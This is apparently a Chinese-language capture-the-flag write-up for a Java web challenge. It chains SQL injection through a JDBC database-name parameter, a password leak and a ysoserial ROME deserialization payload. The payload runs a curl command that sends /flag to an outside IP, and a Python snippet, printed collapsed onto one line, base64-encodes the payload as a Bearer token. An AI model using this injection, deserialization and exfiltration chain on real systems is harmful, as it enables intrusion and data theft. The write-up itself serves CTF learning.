解题过程

先扫一下目录

得到swagger-ui.html

发现几个api接口

sql注入得到密码

![](../Images/6d283a5f5e9c6ded84bd77e7a9a9c44a.png)

源代码中明显存在SQL注入（dbName可控），但是必须满足两个条件，否则不能连接数据库

#号在引号里面时当做填充符，没有实际意义（这个只是在jdbc中这样？还没来得及验证）

最终：

jdbc:mysql://mysqldbserver:3306/myapp#‘ union select 1#

Select TABLE\_COMMENT from INFORMATION\_SCHEMA.TABLES Where table\_schema =‘myapp#‘ union select 1# and table\_name = ‘xxx’

![](../Images/832f4c784ec71397ebfeaceec407823a.png)

  

![](../Images/13c29b37b240a838d0d8102ec496e163.png)

这儿的#号对查询没有影响~

查询密码

![](../Images/502079c90ab4ab8e52a9168c8a17c18a.png)

登录获得token

![](../Images/85e17a3408d6d151783cb51d89be3833.png)

这个一看就知道是java的序列化后的base64编码（如果以aced则为java序列化后的hex编码）

然后我们把返回的data值输入到/common/user/current 接口中，则显示操作成功

![](../Images/c33fa61834f18c5761372ff89f76e9ff.png)

所以我们知道会在这个接口中进行java的反序列化

getflag

我们直接用ysoserial来生成反序列化的值

![](../Images/8a9ecb55dca0df01292ebdd435778d8e.png)

java -jar ysoserial-0.0.5.jar ROME "curl http://174.1.101.83:555 -d @/flag" > HyyMbb.bin

然后进行编码

*   
*   
*   
*   
*   
*   
*   
*   

```
import base64file = open("HyyMbb.bin","rb")now = file.read()ba = base64.b64encode(now)#print(ba)print("Bearer "+ba.decode('utf-8'))#可以解注释此段，并注释上一条print,便于快速测试file.close()
```

发送数据，在vps上监听555端口就可以获得flag了~~
